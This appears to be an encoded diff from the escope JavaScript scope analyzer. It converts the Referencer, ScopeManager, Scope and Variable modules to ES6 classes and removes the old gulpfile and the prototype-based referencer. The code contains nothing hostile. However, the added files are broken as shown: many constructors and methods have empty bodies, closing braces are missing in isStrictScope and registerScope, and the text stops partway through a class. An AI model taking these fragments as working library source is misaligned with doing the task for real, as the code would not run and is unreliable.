{<\n>+            if (node.operator === '=') {<\n>+                this.visitPattern(node.left<c> function (pattern<c> toplevel) {<\n>+                    var maybeImplicitGlobal = null;<\n>+                    if (!that.currentScope().isStrict) {<\n>+                        maybeImplicitGlobal = {<\n>+                            pattern: pattern<c><\n>+                            node: node<\n>+                        };<\n>+                    }<\n>+                    that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> !toplevel);<\n>+                });<\n>+            } else {<\n>+                that.currentScope().__referencing(node.left<c> Reference.RW<c> node.right);<\n>+            }<\n>+        } else {<\n>+            this.visit(node.left);<\n>+        }<\n>+        this.visit(node.right);<\n>+    }<\n>+    CatchClause(node) {<\n>+        var that = this;<\n>+        this.scopeManager.__nestScope(node);<\n>+        this.visitPattern(node.param<c> function (pattern) {<\n>+            that.currentScope().__define(pattern<c><\n>+                new Definition(<\n>+                    Variable.CatchClause<c><\n>+                    node.param<c><\n>+                    node<c><\n>+                    null<c><\n>+                    null<c><\n>+                    null<\n>+                ));<\n>+        });<\n>+        this.visit(node.body);<\n>+        this.close(node);<\n>+    }<\n>+    Program(node) {<\n>+        this.scopeManager.__nestScope(node);<\n>+        if (this.scopeManager.__isES6() && this.scopeManager.isModule()) {<\n>+            this.scopeManager.__nestModuleScope(node);<\n>+        }<\n>+        this.visitChildren(node);<\n>+        this.close(node);<\n>+    }<\n>+    Identifier(node) {<\n>+        this.currentScope().__referencing(node);<\n>+    }<\n>+    UpdateExpression(node) {<\n>+        if (isPattern(node)) {<\n>+            this.currentScope().__referencing(node.argument<c> Reference.RW<c> null);<\n>+        } else {<\n>+            this.visitChildren(node);<\n>+        }<\n>+    }<\n>+    MemberExpression(node) {<\n>+        this.visit(node.object);<\n>+        if (node.computed) {<\n>+            this.visit(node.property);<\n>+        }<\n>+    }<\n>+    Property(node) {<\n>+        this.visitProperty(node);<\n>+    }<\n>+    MethodDefinition(node) {<\n>+        this.visitProperty(node);<\n>+    }<\n>+    BreakStatement() {}<\n>+    ContinueStatement() {}<\n>+    LabelledStatement() {}<\n>+    ForStatement(node) {<\n>+        // Create ForStatement declaration.<\n>+        // NOTE: In ES6<c> ForStatement dynamically generates<\n>+        // per iteration environment. However<c> escope is<\n>+        // a static analyzer<c> we only generate one scope for ForStatement.<\n>+        if (node.init && node.init.type === Syntax.VariableDeclaration && node.init.kind !== 'var') {<\n>+            this.scopeManager.__nestScope(node);<\n>+        }<\n>+        this.visitChildren(node);<\n>+        this.close(node);<\n>+    }<\n>+    ClassExpression(node) {<\n>+        this.visitClass(node);<\n>+    }<\n>+    ClassDeclaration(node) {<\n>+        this.visitClass(node);<\n>+    }<\n>+    CallExpression(node) {<\n>+        // Check this is direct call to eval<\n>+        if (!this.scopeManager.__ignoreEval() && node.callee.type === Syntax.Identifier && node.callee.name === 'eval') {<\n>+            // NOTE: This should be `variableScope`. Since direct eval call always creates Lexical environment and<\n>+            // let / const should be enclosed into it. Only VariableDeclaration affects on the caller's environment.<\n>+            this.currentScope().variableScope.__detectEval();<\n>+        }<\n>+        this.visitChildren(node);<\n>+    }<\n>+    BlockStatement(node) {<\n>+        if (this.scopeManager.__isES6()) {<\n>+            this.scopeManager.__nestScope(node);<\n>+        }<\n>+        this.visitChildren(node);<\n>+        this.close(node);<\n>+    }<\n>+    ThisExpression() {<\n>+        this.currentScope().variableScope.__detectThis();<\n>+    }<\n>+    WithStatement(node) {<\n>+        this.visit(node.object);<\n>+        // Then nest scope for WithStatement.<\n>+        this.scopeManager.__nestScope(node);<\n>+        this.visit(node.body);<\n>+        this.close(node);<\n>+    }<\n>+    VariableDeclaration(node) {<\n>+        var variableTargetScope<c> i<c> iz<c> decl;<\n>+        variableTargetScope = (node.kind === 'var') ? this.currentScope().variableScope : this.currentScope();<\n>+        for (i = 0<c> iz = node.declarations.length; i < iz; ++i) {<\n>+            decl = node.declarations[i];<\n>+            this.visitVariableDeclaration(variableTargetScope<c> Variable.Variable<c> node<c> i);<\n>+            if (decl.init) {<\n>+                this.visit(decl.init);<\n>+            }<\n>+        }<\n>+    }<\n>+    // sec 13.11.8<\n>+    SwitchStatement(node) {<\n>+        var i<c> iz;<\n>+        this.visit(node.discriminant);<\n>+        if (this.scopeManager.__isES6()) {<\n>+            this.scopeManager.__nestScope(node);<\n>+        }<\n>+        for (i = 0<c> iz = node.cases.length; i < iz; ++i) {<\n>+            this.visit(node.cases[i]);<\n>+        }<\n>+        this.close(node);<\n>+    }<\n>+    FunctionDeclaration(node) {<\n>+        this.visitFunction(node);<\n>+    }<\n>+    FunctionExpression(node) {<\n>+        this.visitFunction(node);<\n>+    }<\n>+    ForOfStatement(node) {<\n>+        this.visitForIn(node);<\n>+    }<\n>+    ForInStatement(node) {<\n>+        this.visitForIn(node);<\n>+    }<\n>+    ArrowFunctionExpression(node) {<\n>+        this.visitFunction(node);<\n>+    }<\n>+    ImportDeclaration(node) {<\n>+        var importer;<\n>+        assert(this.scopeManager.__isES6() && this.scopeManager.isModule()<c> 'ImportDeclaration should appear when the mode is ES6 and in the module context.');<\n>+        importer = new Importer(node<c> this);<\n>+        importer.visit(node);<\n>+    }<\n>+    ExportDeclaration(node) {<\n>+        if (node.source) {<\n>+            return;<\n>+        }<\n>+        if (node.declaration) {<\n>+            this.visit(node.declaration);<\n>+            return;<\n>+        }<\n>+        this.visitChildren(node);<\n>+    }<\n>+    ExportSpecifier(node) {<\n>+        this.visit(node.id);<\n>+    }<\n>+/* vim: set sw=4 ts=4 et tw=80 : */<\n>+import WeakMap from 'es6-weak-map';<\n>+import Scope from './scope';<\n>+/**<\n>+ * @class ScopeManager<\n>+ */<\n>+export default class ScopeManager {<\n>+    constructor(options) {<\n>+    __useDirective() {<\n>+    }<\n>+    __isOptimistic() {<\n>+    }<\n>+    __ignoreEval() {<\n>+    }<\n>+    isModule() {<\n>+    }<\n>+    __get(node) {<\n>+    }<\n>+    /**<\n>+     * acquire scope from node.<\n>+     * @method ScopeManager#acquire<\n>+     * @param {Esprima.Node} node - node for the acquired scope.<\n>+     * @param {boolean=} inner - look up the most inner scope<c> default value is false.<\n>+     * @return {Scope?}<\n>+     */<\n>+    acquire(node<c> inner) {<\n>+    }<\n>+    /**<\n>+     * acquire all scopes from node.<\n>+     * @method ScopeManager#acquireAll<\n>+     * @param {Esprima.Node} node - node for the acquired scope.<\n>+     * @return {Scope[]?}<\n>+     */<\n>+    acquireAll(node) {<\n>+    }<\n>+    /**<\n>+     * release the node.<\n>+     * @method ScopeManager#release<\n>+     * @param {Esprima.Node} node - releasing node.<\n>+     * @param {boolean=} inner - look up the most inner scope<c> default value is false.<\n>+     * @return {Scope?} upper scope for the node.<\n>+     */<\n>+    release(node<c> inner) {<\n>+    }<\n>+    attach() { }<\n>+    detach() { }<\n>+    __nestScope(node<c> isMethodDefinition) {<\n>+    }<\n>+    __nestModuleScope(node) {<\n>+    }<\n>+    __nestTDZScope(node) {<\n>+    }<\n>+    __nestFunctionExpressionNameScope(node<c> isMethodDefinition) {<\n>+    }<\n>+    __isES6() {<\n>+    }<\n>+import { Syntax } from 'estraverse';<\n>+import Map from 'es6-map';<\n>+import Reference from './reference';<\n>+import Variable from './variable';<\n>+import Definition from './definition';<\n>+import assert from 'assert';<\n>+function isStrictScope(scope<c> block<c> isMethodDefinition<c> useDirective) {<\n>+    var body<c> i<c> iz<c> stmt<c> expr;<\n>+    // When upper scope is exists and strict<c> inner scope is also strict.<\n>+    if (scope.upper && scope.upper.isStrict) {<\n>+        return true;<\n>+    }<\n>+    // ArrowFunctionExpression's scope is always strict scope.<\n>+    if (block.type === Syntax.ArrowFunctionExpression) {<\n>+        return true;<\n>+    }<\n>+    if (isMethodDefinition) {<\n>+        return true;<\n>+    }<\n>+    if (scope.type === 'class' || scope.type === 'module') {<\n>+        return true;<\n>+    }<\n>+    if (scope.type === 'block' || scope.type === 'switch') {<\n>+        return false;<\n>+    }<\n>+    if (scope.type === 'function') {<\n>+        body = block.body;<\n>+    } else if (scope.type === 'global') {<\n>+        body = block;<\n>+    } else {<\n>+        return false;<\n>+    }<\n>+    // Search 'use strict' directive.<\n>+    if (useDirective) {<\n>+        for (i = 0<c> iz = body.body.length; i < iz; ++i) {<\n>+            stmt = body.body[i];<\n>+            if (stmt.type !== 'DirectiveStatement') {<\n>+                break;<\n>+            }<\n>+            if (stmt.raw === '""use strict""' || stmt.raw === '\'use strict\'') {<\n>+                return true;<\n>+            }<\n>+    } else {<\n>+        for (i = 0<c> iz = body.body.length; i < iz; ++i) {<\n>+            stmt = body.body[i];<\n>+            if (stmt.type !== Syntax.ExpressionStatement) {<\n>+                break;<\n>+            expr = stmt.expression;<\n>+            if (expr.type !== Syntax.Literal || typeof expr.value !== 'string') {<\n>+                break;<\n>+            }<\n>+            if (expr.raw != null) {<\n>+                if (expr.raw === '""use strict""' || expr.raw === '\'use strict\'') {<\n>+                    return true;<\n>+            } else {<\n>+                if (expr.value === 'use strict') {<\n>+                    return true;<\n>+    return false;<\n>+function registerScope(scopeManager<c> scope) {<\n>+    var scopes;<\n>+    scopeManager.scopes.push(scope);<\n>+    scopes = scopeManager.__nodeToScope.get(scope.block);<\n>+    if (scopes) {<\n>+        scopes.push(scope);<\n>+    } else {<\n>+        scopeManager.__nodeToScope.set(scope.block<c> [ scope ]);<\n>+/* Special Scope types. */<\n>+const SCOPE_NORMAL = 0;<\n>+const SCOPE_MODULE = 1;<\n>+const SCOPE_FUNCTION_EXPRESSION_NAME = 2;<\n>+const SCOPE_TDZ = 3;<\n>+/**<\n>+ * @class Scope<\n>+ */<\n>+export default class Scope {<\n>+    constructor(scopeManager<c> block<c> isMethodDefinition<c> scopeType) {<\n>+    __close(scopeManager) {<\n>+    }<\n>+    __resolve(ref) {<\n>+    }<\n>+    __delegateToUpperScope(ref) {<\n>+    }<\n>+    __defineGeneric(name<c> set<c> variables<c> node<c> def) {<\n>+    }<\n>+    __defineArguments() {<\n>+    }<\n>+    __defineImplicit(node<c> def) {<\n>+    }<\n>+    __define(node<c> def) {<\n>+    }<\n>+    __referencing(node<c> assign<c> writeExpr<c> maybeImplicitGlobal<c> partial) {<\n>+    }<\n>+    __detectEval() {<\n>+    }<\n>+    __detectThis() {<\n>+    }<\n>+    isClosed() {<\n>+    }<\n>+    /**<\n>+     * returns resolved {Reference}<\n>+     * @method Scope#resolve<\n>+     * @param {Esprima.Identifier} ident - identifier to be resolved.<\n>+     * @return {Reference}<\n>+     */<\n>+    resolve(ident) {<\n>+    }<\n>+    /**<\n>+     * returns this scope is static<\n>+     * @method Scope#isStatic<\n>+     * @return {boolean}<\n>+     */<\n>+    isStatic() {<\n>+    }<\n>+    /**<\n>+     * returns this scope has materialized arguments<\n>+     * @method Scope#isArgumentsMaterialized<\n>+     * @return {boolean}<\n>+     */<\n>+    isArgumentsMaterialized() {<\n>+    }<\n>+    /**<\n>+     * returns this scope has materialized `this` reference<\n>+     * @method Scope#isThisMaterialized<\n>+     * @return {boolean}<\n>+     */<\n>+    isThisMaterialized() {<\n>+    }<\n>+    isUsedName(name) {<\n>+    }<\n>+Scope.SCOPE_NORMAL = SCOPE_NORMAL;<\n>+Scope.SCOPE_MODULE = SCOPE_MODULE;<\n>+Scope.SCOPE_FUNCTION_EXPRESSION_NAME = SCOPE_FUNCTION_EXPRESSION_NAME;<\n>+Scope.SCOPE_TDZ = SCOPE_TDZ;<\n>+/**<\n>+ * A Variable represents a locally scoped identifier. These include arguments to<\n>+ * functions.<\n>+ * @class Variable<\n>+ */<\n>+export default class Variable {<\n>+    constructor(name<c> scope) {<\n>+Variable.CatchClause = 'CatchClause';<\n>+Variable.Parameter = 'Parameter';<\n>+Variable.FunctionName = 'FunctionName';<\n>+Variable.ClassName = 'ClassName';<\n>+Variable.Variable = 'Variable';<\n>+Variable.ImportBinding = 'ImportBinding';<\n>+Variable.TDZ = 'TDZ';<\n>+Variable.ImplicitGlobalVariable = 'ImplicitGlobalVariable';<\n>","-# Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>-#<\n>-# Redistribution and use in source and binary forms<c> with or without<\n>-# modification<c> are permitted provided that the following conditions are met:<\n>-#<\n>-#   * Redistributions of source code must retain the above copyright<\n>-#     notice<c> this list of conditions and the following disclaimer.<\n>-#   * Redistributions in binary form must reproduce the above copyright<\n>-#     notice<c> this list of conditions and the following disclaimer in the<\n>-#     documentation and/or other materials provided with the distribution.<\n>-#<\n>-# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-# AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-# ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-# DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-# (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-# LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-# ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-# THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-gulp = require 'gulp'<\n>-mocha = require 'gulp-mocha'<\n>-eslint = require 'gulp-eslint'<\n>-minimist = require 'minimist'<\n>-source = require 'vinyl-source-stream'<\n>-browserify = require 'browserify'<\n>-require 'coffee-script/register'<\n>-SOURCE = [<\n>-    'lib/*.js'<\n>-]<\n>-ESLINT_OPTION =<\n>-    rules:<\n>-        'quotes': 0<\n>-        'eqeqeq': 0<\n>-        'no-use-before-define': 0<\n>-        'no-shadow': 0<\n>-        'no-new': 0<\n>-        'no-underscore-dangle': 0<\n>-        'no-multi-spaces': false<\n>-        'no-native-reassign': 0<\n>-        'no-loop-func': 0<\n>-        'no-lone-blocks': 0<\n>-    env:<\n>-        'node': true<\n>-gulp.task 'test'<c> -><\n>-    options = minimist process.argv.slice(2)<c><\n>-        string: 'test'<c><\n>-        default:<\n>-            test: 'test/*.coffee'<\n>-    return gulp.src(options.test).pipe(mocha reporter: 'spec')<\n>-gulp.task 'lint'<c> -><\n>-    return gulp.src(SOURCE)<\n>-    .pipe(eslint(ESLINT_OPTION))<\n>-    .pipe(eslint.formatEach('stylish'<c> process.stderr))<\n>-    .pipe(eslint.failOnError())<\n>-gulp.task 'build'<c> -><\n>-    browserify<\n>-        entries: [ './lib/index.js' ]<\n>-    .bundle()<\n>-    .pipe source 'bundle.js'<\n>-    .pipe gulp.dest 'build'<\n>-gulp.task 'travis'<c> [ 'lint'<c> 'test' ]<\n>-gulp.task 'default'<c> [ 'travis' ]<\n>-/*<\n>-  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>-  Redistribution and use in source and binary forms<c> with or without<\n>-  modification<c> are permitted provided that the following conditions are met:<\n>-    * Redistributions of source code must retain the above copyright<\n>-      notice<c> this list of conditions and the following disclaimer.<\n>-    * Redistributions in binary form must reproduce the above copyright<\n>-      notice<c> this list of conditions and the following disclaimer in the<\n>-      documentation and/or other materials provided with the distribution.<\n>-  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-*/<\n>-(function () {<\n>-    'use strict';<\n>-    var Syntax<c><\n>-        Reference<c><\n>-        Variable<c><\n>-        Definition<c><\n>-        assert<c><\n>-        util<c><\n>-        objectAssign<c><\n>-        estraverse<c><\n>-        esrecurse;<\n>-    util = require('util');<\n>-    objectAssign = require('object-assign');<\n>-    estraverse = require('estraverse');<\n>-    esrecurse = require('esrecurse');<\n>-    Syntax = estraverse.Syntax;<\n>-    Reference = require('./reference');<\n>-    Variable = require('./variable');<\n>-    Definition = require('./definition');<\n>-    assert = require('assert');<\n>-    function traverseIdentifierInPattern(rootPattern<c> callback) {<\n>-        estraverse.traverse(rootPattern<c> {<\n>-            enter: function (pattern<c> parent) {<\n>-                var i<c> iz<c> element<c> property;<\n>-                switch (pattern.type) {<\n>-                    case Syntax.Identifier:<\n>-                        // Toplevel identifier.<\n>-                        if (parent === null) {<\n>-                            callback(pattern<c> true);<\n>-                        }<\n>-                        break;<\n>-                    case Syntax.SpreadElement:<\n>-                        if (pattern.argument.type === Syntax.Identifier) {<\n>-                            callback(pattern.argument<c> false);<\n>-                        }<\n>-                        break;<\n>-                    case Syntax.ObjectPattern:<\n>-                        for (i = 0<c> iz = pattern.properties.length; i < iz; ++i) {<\n>-                            property = pattern.properties[i];<\n>-                            if (property.shorthand) {<\n>-                                callback(property.key<c> false);<\n>-                                continue;<\n>-                            }<\n>-                            if (property.value.type === Syntax.Identifier) {<\n>-                                callback(property.value<c> false);<\n>-                                continue;<\n>-                            }<\n>-                        }<\n>-                        break;<\n>-                    case Syntax.ArrayPattern:<\n>-                        for (i = 0<c> iz = pattern.elements.length; i < iz; ++i) {<\n>-                            element = pattern.elements[i];<\n>-                            if (element && element.type === Syntax.Identifier) {<\n>-                                callback(element<c> false);<\n>-                            }<\n>-                        }<\n>-                        break;<\n>-                }<\n>-            }<\n>-        });<\n>-    }<\n>-    function isPattern(node) {<\n>-        var nodeType = node.type;<\n>-        return nodeType === Syntax.Identifier || nodeType === Syntax.ObjectPattern || nodeType === Syntax.ArrayPattern || nodeType === Syntax.SpreadElement;<\n>-    }<\n>-    // Importing ImportDeclaration.<\n>-    // http://people.mozilla.org/~jorendorff/es6-draft.html#sec-moduledeclarationinstantiation<\n>-    // FIXME: Now<c> we don't create module environment<c> because the context is<\n>-    // implementation dependent.<\n>-    function Importer(declaration<c> referencer) {<\n>-        esrecurse.Visitor.call(this<c> this);<\n>-        this.declaration = declaration;<\n>-        this.referencer = referencer;<\n>-    }<\n>-    util.inherits(Importer<c> esrecurse.Visitor);<\n>-    objectAssign(Importer.prototype<c> {<\n>-        visitImport: function (id<c> specifier) {<\n>-            var that = this;<\n>-            that.referencer.visitPattern(id<c> function (pattern) {<\n>-                that.referencer.currentScope().__define(pattern<c><\n>-                    new Definition(<\n>-                        Variable.ImportBinding<c><\n>-                        pattern<c><\n>-                        specifier<c><\n>-                        that.declaration<c><\n>-                        null<c><\n>-                        null<\n>-                        ));<\n>-            });<\n>-        }<c><\n>-        ImportNamespaceSpecifier: function (node) {<\n>-            if (node.id) {<\n>-                this.visitImport(node.id<c> node);<\n>-            }<\n>-        }<c><\n>-        ImportDefaultSpecifier: function (node) {<\n>-            this.visitImport(node.id<c> node);<\n>-        }<c><\n>-        ImportSpecifier: function (node) {<\n>-            if (node.name) {<\n>-                this.visitImport(node.name<c> node);<\n>-            } else {<\n>-                this.visitImport(node.id<c> node);<\n>-            }<\n>-        }<\n>-    });<\n>-    // Referencing variables and creating bindings.<\n>-    function Referencer(scopeManager) {<\n>-        esrecurse.Visitor.call(this<c> this);<\n>-        this.scopeManager = scopeManager;<\n>-        this.parent = null;<\n>-        this.isInnerMethodDefinition = false;<\n>-    }<\n>-    util.inherits(Referencer<c> esrecurse.Visitor);<\n>-    objectAssign(Referencer.prototype<c> {<\n>-        currentScope: function () {<\n>-            return this.scopeManager.__currentScope;<\n>-        }<c><\n>-        close: function (node) {<\n>-            while (this.currentScope() && node === this.currentScope().block) {<\n>-                this.currentScope().__close(this.scopeManager);<\n>-            }<\n>-        }<c><\n>-        pushInnerMethodDefinition: function (isInnerMethodDefinition) {<\n>-            var previous = this.isInnerMethodDefinition;<\n>-            this.isInnerMethodDefinition = isInnerMethodDefinition;<\n>-            return previous;<\n>-        }<c><\n>-        popInnerMethodDefinition: function (isInnerMethodDefinition) {<\n>-            this.isInnerMethodDefinition = isInnerMethodDefinition;<\n>-        }<c><\n>-        materializeTDZScope: function (node<c> iterationNode) {<\n>-            // http://people.mozilla.org/~jorendorff/es6-draft.html#sec-runtime-semantics-forin-div-ofexpressionevaluation-abstract-operation<\n>-            // TDZ scope hides the declaration's names.<\n>-            this.scopeManager.__nestTDZScope(node<c> iterationNode);<\n>-            this.visitVariableDeclaration(this.currentScope()<c> Variable.TDZ<c> iterationNode.left<c> 0);<\n>-        }<c><\n>-        materializeIterationScope: function (node) {<\n>-            // Generate iteration scope for upper ForIn/ForOf Statements.<\n>-            // parent node for __nestScope is only necessary to<\n>-            // distinguish MethodDefinition.<\n>-            var letOrConstDecl<c> that = this;<\n>-            this.scopeManager.__nestScope(node<c> false);<\n>-            letOrConstDecl = node.left;<\n>-            this.visitVariableDeclaration(this.currentScope()<c> Variable.Variable<c> letOrConstDecl<c> 0);<\n>-            this.visitPattern(letOrConstDecl.declarations[0].id<c> function (pattern) {<\n>-                that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>-            });<\n>-        }<c><\n>-        visitPattern: function (node<c> callback) {<\n>-            traverseIdentifierInPattern(node<c> callback);<\n>-        }<c><\n>-        visitFunction: function (node) {<\n>-            var i<c> iz<c> that = this;<\n>-            // FunctionDeclaration name is defined in upper scope<\n>-            // NOTE: Not referring variableScope. It is intended.<\n>-            // Since<\n>-            //  in ES5<c> FunctionDeclaration should be in FunctionBody.<\n>-            //  in ES6<c> FunctionDeclaration should be block scoped.<\n>-            if (node.type === Syntax.FunctionDeclaration) {<\n>-                // id is defined in upper scope<\n>-                this.currentScope().__define(node.id<c><\n>-                        new Definition(<\n>-                            Variable.FunctionName<c><\n>-                            node.id<c><\n>-                            node<c><\n>-                            null<c><\n>-                            null<c><\n>-                            null<\n>-                        ));<\n>-            }<\n>-            // Consider this function is in the MethodDefinition.<\n>-            this.scopeManager.__nestScope(node<c> this.isInnerMethodDefinition);<\n>-            for (i = 0<c> iz = node.params.length; i < iz; ++i) {<\n>-                this.visitPattern(node.params[i]<c> function (pattern) {<\n>-                    that.currentScope().__define(pattern<c><\n>-                        new Definition(<\n>-                            Variable.Parameter<c><\n>-                            pattern<c><\n>-                            node<c><\n>-                            null<c><\n>-                            i<c><\n>-                            null<\n>-                        ));<\n>-                });<\n>-            }<\n>-            // Skip BlockStatement to prevent creating BlockStatement scope.<\n>-            if (node.body.type === Syntax.BlockStatement) {<\n>-                this.visitChildren(node.body);<\n>-            } else {<\n>-                this.visit(node.body);<\n>-            }<\n>-            this.close(node);<\n>-        }<c><\n>-        visitClass: function (node) {<\n>-            if (node.type === Syntax.ClassDeclaration) {<\n>-                this.currentScope().__define(node.id<c><\n>-                        new Definition(<\n>-                            Variable.ClassName<c><\n>-                            node.id<c><\n>-                            node<c><\n>-                            null<c><\n>-                            null<c><\n>-                            null<\n>-                        ));<\n>-            }<\n>-            // FIXME: Maybe consider TDZ.<\n>-            this.visit(node.superClass);<\n>-            this.scopeManager.__nestScope(node);<\n>-            if (node.id) {<\n>-                this.currentScope().__define(node.id<c><\n>-                        new Definition(<\n>-                            Variable.ClassName<c><\n>-                            node.id<c><\n>-                            node<\n>-                        ));<\n>-            }<\n>-            this.visit(node.body);<\n>-            this.close(node);<\n>-        }<c><\n>-        visitProperty: function (node) {<\n>-            var previous<c> isMethodDefinition;<\n>-            if (node.computed) {<\n>-                this.visit(node.key);<\n>-            }<\n>-            isMethodDefinition = node.type === Syntax.MethodDefinition || node.method;<\n>-            if (isMethodDefinition) {<\n>-                previous = this.pushInnerMethodDefinition(true);<\n>-            }<\n>-            this.visit(node.value);<\n>-            if (isMethodDefinition) {<\n>-                this.popInnerMethodDefinition(previous);<\n>-            }<\n>-        }<c><\n>-        visitForIn: function (node) {<\n>-            var that = this;<\n>-            if (node.left.type === Syntax.VariableDeclaration && node.left.kind !== 'var') {<\n>-                this.materializeTDZScope(node.right<c> node);<\n>-                this.visit(node.right);<\n>-                this.close(node.right);<\n>-                this.materializeIterationScope(node);<\n>-                this.visit(node.body);<\n>-                this.close(node);<\n>-            } else {<\n>-                if (node.left.type === Syntax.VariableDeclaration) {<\n>-                    this.visit(node.left);<\n>-                    this.visitPattern(node.left.declarations[0].id<c> function (pattern) {<\n>-                        that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>-                    });<\n>-                } else {<\n>-                    if (!isPattern(node.left)) {<\n>-                        this.visit(node.left);<\n>-                    }<\n>-                    this.visitPattern(node.left<c> function (pattern) {<\n>-                        var maybeImplicitGlobal = null;<\n>-                        if (!that.currentScope().isStrict) {<\n>-                            maybeImplicitGlobal = {<\n>-                                pattern: pattern<c><\n>-                                node: node<\n>-                            };<\n>-                        }<\n>-                        that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> true);<\n>-                    });<\n>-                }<\n>-                this.visit(node.right);<\n>-                this.visit(node.body);<\n>-            }<\n>-        }<c><\n>-        visitVariableDeclaration: function (variableTargetScope<c> type<c> node<c> index) {<\n>-            var decl<c> init<c> that = this;<\n>-            decl = node.declarations[index];<\n>-            init = decl.init;<\n>-            // FIXME: Don't consider initializer with complex patterns.<\n>-            // Such as<c><\n>-            // var [a<c> b<c> c = 20] = array;<\n>-            this.visitPattern(decl.id<c> function (pattern<c> toplevel) {<\n>-                variableTargetScope.__define(pattern<c><\n>-                    new Definition(<\n>-                        type<c><\n>-                        pattern<c><\n>-                        decl<c><\n>-                        node<c><\n>-                        index<c><\n>-                        node.kind<\n>-                    ));<\n>-                if (init) {<\n>-                    that.currentScope().__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !toplevel);<\n>-                }<\n>-            });<\n>-        }<c><\n>-        AssignmentExpression: function (node) {<\n>-            var that = this;<\n>-            if (isPattern(node.left)) {<\n>-                if (node.operator === '=') {<\n>-                    this.visitPattern(node.left<c> function (pattern<c> toplevel) {<\n>-                        var maybeImplicitGlobal = null;<\n>-                        if (!that.currentScope().isStrict) {<\n>-                            maybeImplicitGlobal = {<\n>-                                pattern: pattern<c><\n>-                                node: node<\n>-                            };<\n>-                        }<\n>-                        that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> !toplevel);<\n>-                    });<\n>-                } else {<\n>-                    that.currentScope().__referencing(node.left<c> Reference.RW<c> node.right);<\n>-                }<\n>-            } else {<\n>-                this.visit(node.left);<\n>-            }<\n>-            this.visit(node.right);<\n>-        }<c><\n>-        CatchClause: function (node) {<\n>-            var that = this;<\n>-            this.scopeManager.__nestScope(node);<\n>-            this.visitPattern(node.param<c> function (pattern) {<\n>-                that.currentScope().__define(pattern<c><\n>-                    new Definition(<\n>-                        Variable.CatchClause<c><\n>-                        node.param<c><\n>-                        node<c><\n>-                        null<c><\n>-                        null<c><\n>-                        null<\n>-                    ));<\n>-            });<\n>-            this.visit(node.body);<\n>-            this.close(node);<\n>-        }<c><\n>-        Program: function (node) {<\n>-            this.scopeManager.__nestScope(node);<\n>-            if (this.scopeManager.__isES6() && this.scopeManager.isModule()) {<\n>-                this.scopeManager.__nestModuleScope(node);<\n>-            }<\n>-            this.visitChildren(node);<\n>-            this.close(node);<\n>-        }<c><\n>-        Identifier: function (node) {<\n>-            this.currentScope().__referencing(node);<\n>-        }<c><\n>-        UpdateExpression: function (node) {<\n>-            if (isPattern(node)) {<\n>-                this.currentScope().__referencing(node.argument<c> Reference.RW<c> null);<\n>-            } else {<\n>-                this.visitChildren(node);<\n>-            }<\n>-        }<c><\n>-        MemberExpression: function (node) {<\n>-            this.visit(node.object);<\n>-            if (node.computed) {<\n>-                this.visit(node.property);<\n>-            }<\n>-        }<c><\n>-        Property: function (node) {<\n>-            this.visitProperty(node);<\n>-        }<c><\n>-        MethodDefinition: function (node) {<\n>-            this.visitProperty(node);<\n>-        }<c><\n>-        BreakStatement: function () {}<c><\n>-        ContinueStatement: function () {}<c><\n>-        LabelledStatement: function () {}<c><\n>-        ForStatement: function (node) {<\n>-            // Create ForStatement declaration.<\n>-            // NOTE: In ES6<c> ForStatement dynamically generates<\n>-            // per iteration environment. However<c> escope is<\n>-            // a static analyzer<c> we only generate one scope for ForStatement.<\n>-            if (node.init && node.init.type === Syntax.VariableDeclaration && node.init.kind !== 'var') {<\n>-                this.scopeManager.__nestScope(node);<\n>-            }<\n>-            this.visitChildren(node);<\n>-            this.close(node);<\n>-        }<c><\n>-        ClassExpression: function (node) {<\n>-            this.visitClass(node);<\n>-        }<c><\n>-        ClassDeclaration: function (node) {<\n>-            this.visitClass(node);<\n>-        